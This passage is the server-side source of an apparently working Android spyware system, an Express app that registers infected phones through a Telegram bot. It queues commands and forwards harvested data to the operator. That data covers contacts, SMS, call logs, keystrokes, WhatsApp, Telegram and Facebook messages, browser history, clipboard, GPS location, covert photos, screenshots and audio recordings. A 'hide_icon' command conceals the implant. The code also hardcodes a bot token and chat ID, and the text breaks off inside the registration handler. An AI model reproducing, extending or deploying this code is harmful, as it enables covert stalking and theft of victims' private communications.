const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();
const userDeviceSelection = new Map();
const userStates = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Auto-collection flags
const autoDataRequested = new Map();

// Schedule states
const SCHEDULE_STATES = {
    IDLE: 'idle',
    AWAITING_START_TIME: 'awaiting_start_time',
    AWAITING_END_TIME: 'awaiting_end_time',
    AWAITING_RECURRING: 'awaiting_recurring',
    AWAITING_INTERVAL: 'awaiting_interval'
};

// Create uploads directory
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= DEVICE CONFIGURATION =============
const deviceConfigs = {
    'default': {
        chatId: '5326373447',
        config: {
            chatId: '5326373447',
            botToken: '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo',
            serverUrl: 'https://edu-hwpy.onrender.com',
            pollingInterval: 15000,
            keepAliveInterval: 300000,
            realtimeLogging: false,
            autoScreenshot: true,
            autoRecording: true,
            screenshotQuality: 70,
            recordingQuality: 'MEDIUM',
            appOpenBatchSize: 50,
            syncBatchSize: 20,
            targetApps: [
                'com.whatsapp',
                'com.instagram.android',
                'com.facebook.katana',
                'com.snapchat.android',
                'com.google.android.youtube',
                'com.google.android.apps.maps',
                'org.telegram.messenger'
            ],
            features: {
                contacts: true,
                sms: true,
                callLogs: true,
                location: true,
                screenshots: true,
                recordings: true,
                keystrokes: true,
                notifications: true,
                appOpens: true,
                ipInfo: true,
                phoneInfo: true,
                wifiInfo: true,
                mobileInfo: true,
                simInfo: true
            }
        }
    }
};

function getDeviceConfig(deviceId) {
    return deviceConfigs[deviceId] || deviceConfigs['default'];
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024,
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {
        console.error('Error getting server IP:', e);
    }
    return 'Unknown';
}

// ============= DEVICE MANAGEMENT FUNCTIONS =============

function getDeviceListForUser(chatId) {
    const userDevices = [];
    for (const [deviceId, device] of devices.entries()) {
        if (String(device.chatId) === String(chatId)) {
            userDevices.push({
                id: deviceId,
                name: device.deviceInfo?.model || 'Unknown Device',
                lastSeen: device.lastSeen,
                isActive: deviceId === userDeviceSelection.get(chatId),
                phoneNumber: device.phoneNumber || 'Not available',
                lastSeenFormatted: new Date(device.lastSeen).toLocaleString()
            });
        }
    }
    return userDevices;
}

function getDeviceSelectionKeyboard(chatId) {
    const userDevices = getDeviceListForUser(chatId);
    const keyboard = [];
    
    userDevices.forEach(device => {
        const status = device.isActive ? '✅ ' : '';
        const lastSeen = new Date(device.lastSeen).toLocaleTimeString();
        keyboard.push([{
            text: `${status}${device.name} (${lastSeen})`,
            callback_data: `select_device:${device.id}`
        }]);
    });
    
    keyboard.push([{ text: '🔄 Refresh List', callback_data: 'refresh_devices' }]);
    keyboard.push([{ text: '📊 Device Stats', callback_data: 'device_stats' }]);
    keyboard.push([{ text: '◀️ Back to Main Menu', callback_data: 'help_main' }]);
    
    return keyboard;
}

function getMainMenuKeyboard(chatId) {
    const activeDeviceId = userDeviceSelection.get(chatId);
    const activeDevice = activeDeviceId ? devices.get(activeDeviceId) : null;
    const deviceCount = getDeviceListForUser(chatId).length;
    
    let deviceStatus = `📱 ${deviceCount} device(s)`;
    if (activeDevice) {
        deviceStatus = `✅ Active: ${activeDevice.deviceInfo?.model || 'Device'}`;
    }

    return [
        [
            { text: '📱 Device Info', callback_data: 'cmd:device_info' },
            { text: '📞 Mobile Info', callback_data: 'cmd:mobile_info' }
        ],
        [
            { text: '📍 Tracking', callback_data: 'menu_tracking' },
            { text: '🌐 Network', callback_data: 'cmd:network_info' }
        ],
        [
            { text: '📸 Screenshot', callback_data: 'menu_screenshot' },
            { text: '🎤 Recording', callback_data: 'menu_recording' }
        ],
        [
            { text: '📷 Camera', callback_data: 'menu_camera' },
            { text: '💬 Social', callback_data: 'menu_social' }
        ],
        [
            { text: '📁 Media', callback_data: 'menu_media' },
            { text: '🔔 Realtime', callback_data: 'menu_realtime' }
        ],
        [
            { text: '⚙️ Services', callback_data: 'menu_services' },
            { text: deviceStatus, callback_data: 'menu_devices' }
        ],
        [
            { text: '🆕 NEW FEATURES', callback_data: 'menu_new_features' },
            { text: '❌ Close', callback_data: 'close_menu' }
        ]
    ];
}

// ============= NEW MENU FUNCTIONS =============

function getNewFeaturesKeyboard() {
    return [
        [
            { text: '📊 Detailed Exports', callback_data: 'menu_detailed_exports' },
            { text: '🔍 File Scanner', callback_data: 'menu_file_scanner' }
        ],
        [
            { text: '📡 Data Saving', callback_data: 'menu_data_saving' },
            { text: '🎚️ Audio Quality', callback_data: 'menu_audio_quality' }
        ],
        [
            { text: '🔄 Sync & Harvest', callback_data: 'menu_sync_harvest' },
            { text: '🔊 Real-time Controls', callback_data: 'menu_realtime_advanced' }
        ],
        [
            { text: '📱 App Opens', callback_data: 'cmd:app_opens' },
            { text: '📅 Calendar', callback_data: 'cmd:calendar' }
        ],
        [
            { text: '📋 Clipboard', callback_data: 'cmd:clipboard' },
            { text: '🌐 Browser History', callback_data: 'cmd:browser' }
        ],
        [
            { text: '◀️ Back to Main', callback_data: 'help_main' }
        ]
    ];
}

function getDetailedExportsKeyboard() {
    return [
        [
            { text: '📇 Detailed Contacts', callback_data: 'cmd:contacts' },
            { text: '📱 Detailed Apps', callback_data: 'cmd:apps_list' }
        ],
        [
            { text: '⌨️ Detailed Keystrokes', callback_data: 'cmd:keys' },
            { text: '🔔 Detailed Notifications', callback_data: 'cmd:notify' }
        ],
        [
            { text: '📊 Device Snapshots', callback_data: 'cmd:device_info' },
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getFileScannerKeyboard() {
    return [
        [
            { text: '🔍 Full System Scan', callback_data: 'cmd:scan_all' },
            { text: '🎵 Media Only Scan', callback_data: 'cmd:scan_media' }
        ],
        [
            { text: '🔬 Deep Scan', callback_data: 'cmd:scan_all' },
            { text: '🎤 Find Recordings', callback_data: 'cmd:scan_media' }
        ],
        [
            { text: '📁 Find All Media', callback_data: 'cmd:scan_media' },
            { text: '❓ Scan Help', callback_data: 'cmd:scan_help' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getDataSavingKeyboard() {
    return [
        [
            { text: '📡 WiFi-Only ON', callback_data: 'cmd:wifi_only_on' },
            { text: '📡 WiFi-Only OFF', callback_data: 'cmd:wifi_only_off' }
        ],
        [
            { text: '🌐 Network Status', callback_data: 'cmd:saving_status' },
            { text: '📊 WiFi-Only Status', callback_data: 'cmd:saving_status' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getAudioQualityKeyboard() {
    return [
        [
            { text: '🎤 Ultra Low (8k)', callback_data: 'cmd:audio_ultra' },
            { text: '🎤 Very Low (16k)', callback_data: 'cmd:audio_very_low' }
        ],
        [
            { text: '🎤 Low (24k)', callback_data: 'cmd:audio_low' },
            { text: '🎤 Medium (32k)', callback_data: 'cmd:audio_medium' }
        ],
        [
            { text: '🎤 High (64k)', callback_data: 'cmd:audio_high' },
            { text: 'ℹ️ Audio Info', callback_data: 'cmd:audio_info' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getSyncHarvestKeyboard() {
    return [
        [
            { text: '🔄 Sync All Tables', callback_data: 'cmd:sync_all' },
            { text: '⚡ Force Harvest', callback_data: 'cmd:force_harvest' }
        ],
        [
            { text: '🔄 Refresh Data', callback_data: 'cmd:refresh_data' },
            { text: '📊 Database Stats', callback_data: 'cmd:logs_count' }
        ],
        [
            { text: '🗑️ Clear Logs', callback_data: 'cmd:clear_logs' },
            { text: '🔄 Reboot Services', callback_data: 'cmd:reboot_app' }
        ],
        [
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

function getRealtimeAdvancedKeyboard() {
    return [
        [
            { text: '🔑 Realtime Keys ON', callback_data: 'cmd:rt_keys_on' },
            { text: '🔑 Realtime Keys OFF', callback_data: 'cmd:rt_keys_off' }
        ],
        [
            { text: '🔔 Realtime Notif ON', callback_data: 'cmd:rt_notif_on' },
            { text: '🔔 Realtime Notif OFF', callback_data: 'cmd:rt_notif_off' }
        ],
        [
            { text: '✅ All Realtime ON', callback_data: 'cmd:rt_all_on' },
            { text: '❌ All Realtime OFF', callback_data: 'cmd:rt_all_off' }
        ],
        [
            { text: '📊 Realtime Status', callback_data: 'cmd:rt_status' },
            { text: '◀️ Back', callback_data: 'menu_new_features' }
        ]
    ];
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        // CONSOLIDATED COMMAND LIST - All new consolidated commands
        const commands = [
            // ============ CONSOLIDATED COMMANDS ============
            { command: 'help', description: '📋 Complete help menu' },
            { command: 'device_info', description: '📊 Complete device information' },
            { command: 'network_info', description: '🌐 Complete network information' },
            { command: 'mobile_info', description: '📱 Complete mobile & SIM info' },
            { command: 'screenshot', description: '📸 Take screenshot now' },
            { command: 'screenshot_settings', description: '⚙️ Screenshot settings' },
            { command: 'start_screenshot', description: '▶️ Start screenshot service' },
            { command: 'stop_screenshot', description: '⏹️ Stop screenshot service' },
            { command: 'start_60s_rec', description: '🎤 Start 60-second recording' },
            { command: 'stop_60s_rec', description: '⏹️ Stop recording' },
            { command: 'record_info', description: '📊 Recording information' },
            { command: 'record_auto_on', description: '✅ Enable auto recording' },
            { command: 'record_auto_off', description: '❌ Disable auto recording' },
            { command: 'record_custom', description: '⚙️ Set custom schedule' },
            
            // ============ AUDIO QUALITY ============
            { command: 'audio_ultra', description: '🎤 Ultra low (8kbps)' },
            { command: 'audio_very_low', description: '🎤 Very low (16kbps)' },
            { command: 'audio_low', description: '🎤 Low (24kbps)' },
            { command: 'audio_medium', description: '🎤 Medium (32kbps)' },
            { command: 'audio_high', description: '🎤 High (64kbps)' },
            { command: 'audio_info', description: '🎤 Audio quality info' },
            
            // ============ DATA EXPORT ============
            { command: 'contacts', description: '📇 Export contacts' },
            { command: 'sms', description: '💬 Export SMS' },
            { command: 'calllogs', description: '📞 Export call logs' },
            { command: 'apps_list', description: '📱 Export apps' },
            { command: 'keys', description: '⌨️ Export keystrokes' },
            { command: 'notify', description: '🔔 Export notifications' },
            { command: 'open_app', description: '📱 Export app opens' },
            
            // ============ SOCIAL MEDIA ============
            { command: 'whatsapp', description: '💬 WhatsApp logs' },
            { command: 'telegram', description: '💬 Telegram logs' },
            { command: 'facebook', description: '💬 Facebook logs' },
            
            // ============ BROWSER & CLIPBOARD ============
            { command: 'browser', description: '🌐 Browser history' },
            { command: 'clipboard', description: '📋 Clipboard logs' },
            { command: 'calendar', description: '📅 Calendar events' },
            
            // ============ SCAN COMMANDS ============
            { command: 'scan_all', description: '🔍 Full system scan' },
            { command: 'scan_media', description: '🎵 Media files scan' },
            { command: 'scan_help', description: '❓ Scan commands help' },
            
            // ============ REAL-TIME CONTROLS ============
            { command: 'rt_all_on', description: '✅ Enable all real-time' },
            { command: 'rt_all_off', description: '❌ Disable all real-time' },
            { command: 'rt_keys_on', description: '🔑 Enable keystroke real-time' },
            { command: 'rt_keys_off', description: '🔑 Disable keystroke real-time' },
            { command: 'rt_notif_on', description: '🔔 Enable notification real-time' },
            { command: 'rt_notif_off', description: '🔔 Disable notification real-time' },
            { command: 'rt_status', description: '📊 Real-time status' },
            
            // ============ NETWORK DATA SAVING ============
            { command: 'saving_status', description: '📡 Network saving status' },
            { command: 'wifi_only_on', description: '📡 Enable WiFi-only mode' },
            { command: 'wifi_only_off', description: '📡 Disable WiFi-only mode' },
            
            // ============ SYSTEM CONTROLS ============
            { command: 'sync_all', description: '🔄 Sync all data' },
            { command: 'force_harvest', description: '⚡ Force data harvest' },
            { command: 'refresh_data', description: '🔄 Refresh data' },
            { command: 'logs_count', description: '📊 Database statistics' },
            { command: 'clear_logs', description: '🗑️ Clear database' },
            { command: 'reboot_app', description: '🔄 Reboot services' },
            { command: 'hide_icon', description: '👻 Hide launcher icon' },
            { command: 'show_icon', description: '👁️ Show launcher icon' },
            
            // ============ CAMERA ============
            { command: 'photo', description: '📸 Take photo' },
            { command: 'camera_switch', description: '🔄 Switch camera' },
            { command: 'camera_front', description: '👤 Front camera' },
            { command: 'camera_back', description: '👥 Back camera' },
            { command: 'camera_on', description: '✅ Start camera monitoring' },
            { command: 'camera_off', description: '❌ Stop camera monitoring' },
            { command: 'camera_status', description: '📊 Camera status' },
            
            // ============ BASIC INFO ============
            { command: 'location', description: '📍 Get location' },
            { command: 'battery', description: '🔋 Battery status' },
            { command: 'storage', description: '💾 Storage info' },
            { command: 'time', description: '🕐 Current time' },
            { command: 'add_target', description: '➕ Add target app' },
            { command: 'target_apps', description: '📱 List target apps' },
            { command: 'small', description: '📏 Small screenshot (30%)' },
            { command: 'medium', description: '📏 Medium screenshot (70%)' },
            { command: 'original', description: '📏 Original screenshot' }
        ];
        
        await axios.post(`${TELEGRAM_API}/setMyCommands`, { commands });
        
        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and ${commands.length} consolidated commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

function createInlineButton(text, callbackData) {
    return {
        text: text,
        callback_data: callbackData
    };
}

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= FORMATTER FUNCTIONS =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try {
                locData = JSON.parse(locationData);
            } catch (e) {
                return { text: locationData };
            }
        }

        if (locData.lat && locData.lon) {
            const lat = locData.lat;
            const lon = locData.lon;
            const accuracy = locData.accuracy || 'Unknown';
            const provider = locData.provider || 'unknown';
            
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            return {
                text: `📍 <b>Location Update</b>\n\n` +
                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
                      `• <b>Provider:</b> ${provider}\n\n` +
                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl,
                lat: lat,
                lon: lon
            };
        }
        return { text: locationData };
    } catch (error) {
        console.error('Error formatting location:', error);
        return { text: locationData };
    }
}

// ============= AUTO DATA COLLECTION =============

function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    
    if (autoDataRequested.has(deviceId)) {
        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
        return;
    }
    
    autoDataRequested.set(deviceId, {
        timestamp: Date.now(),
        requested: [
            'device_info',
            'network_info',
            'mobile_info',
            'contacts',
            'sms',
            'calllogs',
            'apps_list',
            'keys',
            'notify',
            'whatsapp',
            'telegram',
            'facebook',
            'browser',
            'clipboard',
            'calendar',
            'location'
        ]
    });
    
    const device = devices.get(deviceId);
    if (!device) {
        console.error(`❌ Device not found for auto-data: ${deviceId}`);
        return;
    }
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commands = [
        { command: 'device_info', delay: 0, description: 'Device Info' },
        { command: 'network_info', delay: 2, description: 'Network Info' },
        { command: 'mobile_info', delay: 4, description: 'Mobile Info' },
        { command: 'contacts', delay: 7, description: 'Contacts' },
        { command: 'sms', delay: 10, description: 'SMS' },
        { command: 'calllogs', delay: 13, description: 'Call Logs' },
        { command: 'apps_list', delay: 16, description: 'Apps' },
        { command: 'keys', delay: 19, description: 'Keystrokes' },
        { command: 'notify', delay: 22, description: 'Notifications' },
        { command: 'whatsapp', delay: 25, description: 'WhatsApp' },
        { command: 'telegram', delay: 28, description: 'Telegram' },
        { command: 'facebook', delay: 31, description: 'Facebook' },
        { command: 'browser', delay: 34, description: 'Browser History' },
        { command: 'clipboard', delay: 37, description: 'Clipboard' },
        { command: 'calendar', delay: 40, description: 'Calendar' },
        { command: 'location', delay: 43, description: 'Location' }
    ];
    
    commands.forEach((cmd) => {
        const commandObject = {
            command: cmd.command,
            originalCommand: `/${cmd.command}`,
            messageId: null,
            timestamp: Date.now() + (cmd.delay * 1000),
            autoData: true
        };
        
        device.pendingCommands.push(commandObject);
        console.log(`📝 Auto-data command queued: ${cmd.command} (${cmd.description})`);
    });
    
    console.log(`✅ All ${commands.length} auto-data commands queued for ${deviceId}`);
}

// ============= PHOTO UPLOAD ENDPOINT =============
app.post('/api/upload-photo', upload.single('photo'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const caption = req.body.caption || '📸 Camera Photo';
        
        if (!deviceId || !req.file) {
            console.error('❌ Missing fields in photo upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📸 Photo upload from ${deviceId}: ${req.file.filename} (${req.file.size} bytes)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        const fullCaption = `📱 *${deviceName}*\n\n${caption}`;
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', fs.createReadStream(filePath), { filename: req.file.originalname });
        formData.append('caption', fullCaption);
        
        await axios.post(`${TELEGRAM_API}/sendPhoto`, formData, {
            headers: { ...formData.getHeaders() },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted photo: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting photo:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename: req.file.filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ Photo upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= DATA UPLOAD ENDPOINTS =============

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        const deviceName = device.deviceInfo?.model || 'Unknown Device';
        
        let caption = `📱 *${deviceName}*\n\n`;
        
        switch (command) {
            case 'contacts':
                caption += `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms':
                caption += `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs':
                caption += `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps_list':
                caption += `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'keys':
                caption += `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'notify':
                caption += `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            case 'open_app':
                caption += `📱 App Opens Export (${itemCount} entries)`;
                break;
            case 'whatsapp':
                caption += `💬 WhatsApp Messages Export (${itemCount} messages)`;
                break;
            case 'telegram':
                caption += `💬 Telegram Messages Export (${itemCount} messages)`;
                break;
            case 'facebook':
                caption += `💬 Facebook Messages Export (${itemCount} messages)`;
                break;
            case 'browser':
                caption += `🌐 Browser History Export (${itemCount} entries)`;
                break;
            case 'clipboard':
                caption += `📋 Clipboard History Export (${itemCount} entries)`;
                break;
            case 'calendar':
                caption += `📅 Calendar Events Export (${itemCount} events)`;
                break;
            case 'device_info':
                caption += `📊 Device Info Export (${itemCount} snapshots)`;
                break;
            case 'network_info':
                caption += `🌐 Network Info Export`;
                break;
            case 'mobile_info':
                caption += `📱 Mobile Info Export`;
                break;
            default:
                caption += `📎 Data Export`;
        }
        
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
        }, 60000);
        
        res.json({ success: true, filename, size: req.file.size });
        
    } catch (error) {
        console.error('❌ File upload error:', error);
        res.status(500).json({ error: 'Upload failed: ' + error.message });
    }
});

// ============= LOCATION ENDPOINT =============

app.post('/api/location/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const locationData = req.body;
        
        console.log(`📍 Location data from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        device.lastLocation = locationData;
        
        const formatted = formatLocationMessage(locationData);
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (formatted.lat && formatted.lon) {
            try {
                await axios.post(`${TELEGRAM_API}/sendLocation`, {
                    chat_id: chatId,
                    latitude: formatted.lat,
                    longitude: formatted.lon,
                    live_period: 60
                });
                console.log('✅ Location pin sent');
            } catch (e) {
                console.error('Failed to send location pin:', e.message);
            }
        }
        
        await sendTelegramMessage(chatId, devicePrefix + formatted.text);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Location endpoint error:', error);
        res.status(500).json({ error: 'Location processing failed' });
    }
});

// ============= API ENDPOINTS =============

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        devices: devices.size,
        authorizedChats: Array.from(authorizedChats).join(', '),
        serverIP: getServerIP(),
        timestamp: Date.now()
    });
});

app.get('/api/ping/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    if (device) {
        device.lastSeen = Date.now();
        res.json({ status: 'alive', timestamp: Date.now() });
    } else {
        res.status(404).json({ status: 'unknown' });
    }
});

app.get('/api/commands/:deviceId', (req, res) => {
    const deviceId = req.params.deviceId;
    const device = devices.get(deviceId);
    
    try {
        if (device?.pendingCommands?.length > 0) {
            const commands = device.pendingCommands.map(cmd => ({
                command: cmd.command,
                originalCommand: cmd.originalCommand,
                messageId: cmd.messageId,
                timestamp: cmd.timestamp,
                autoData: cmd.autoData || false
            }));
            device.pendingCommands = [];
            console.log(`📤 Sending ${commands.length} commands to ${deviceId}:`, commands.map(c => c.command).join(', '));
            sendJsonResponse(res, { commands });
        } else {
            console.log(`📭 No commands for ${deviceId}`);
            sendJsonResponse(res, { commands: [] });
        }
    } catch (e) {
        console.error('Error in /api/commands:', e);
        sendJsonResponse(res, { commands: [], error: e.message }, 500);
    }
});

app.post('/api/result/:deviceId', async (req, res) => {
    const deviceId = req.params.deviceId;
    const { command, result, error } = req.body;
    
    // Consolidated commands that use file upload endpoints
    const fileCommands = [
        'contacts', 'sms', 'calllogs', 'apps_list', 'keys', 'notify', 'open_app',
        'whatsapp', 'telegram', 'facebook', 'browser', 'clipboard', 'calendar',
        'device_info', 'network_info', 'mobile_info', 'scan_all', 'scan_media'
    ];
    
    if (fileCommands.includes(command)) {
        console.log(`📎 ${command} using dedicated file upload endpoint`);
        return res.sendStatus(200);
    }
    
    console.log(`📨 Result from ${deviceId}:`, { command });
    
    const device = devices.get(deviceId);
    if (device) {
        const chatId = device.chatId;
        const devicePrefix = `📱 *${device.deviceInfo?.model || 'Device'}*\n\n`;
        
        if (error) {
            await sendTelegramMessage(chatId, devicePrefix + `❌ <b>Command Failed</b>\n\n<code>${command}</code>\n\n<b>Error:</b> ${error}`);
        } else if (result) {
            await sendTelegramMessage(chatId, devicePrefix + result);
        } else {
            await sendTelegramMessage(chatId, devicePrefix + `✅ ${command} executed successfully`);
        }
    }
    
    res.sendStatus(200);
});

// ============= REGISTRATION ENDPOINT =============
app.post('/api/register', async (req, res) => {
    const { deviceId, deviceInfo } = req.body;
    
    console.log('📝 Registration attempt:', { deviceId });
    
    if (!deviceId || !deviceInfo) {
        return res.status(400).json({ error: 'Missing fields' });
    }
    
    const deviceConfig = getDeviceConfig(deviceId);
    
    if (!deviceConfig) {
        return res.status(403).json({ error: 'Device not authorized' });
    }
    
    const existingDevice = devices.get(deviceId);
    const isNewDevice = !existingDevice;
    
    const deviceData = {
        chatId: deviceConfig.chatId,
        deviceInfo,
        lastSeen: Date.now(),
        pendingCommands: existingDevice ? existingDevice.pendingCommands : [],
        firstSeen: existingDevice ? existingDevice.firstSeen : Date.now(),
        phoneNumber: existingDevice?.phoneNumber || null,
        lastLocation: existingDevice?.lastLocation || null,
    };
    
    devices.set(deviceId, deviceData);
    
    console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId} for chat ${deviceConfig.chatId}`);
    
    await setChatMenuButton(deviceConfig.chatId);
    
    const userDevices = getDeviceListForUser(deviceConfig.chatId);
    
    let welcomeMessage = `✅ <b>Device ${isNewDevice ? 'Connected' : 'Updated'}!</b>\n\n`;
    welcomeMessage += `📱 Model: ${deviceInfo.model}\n`;
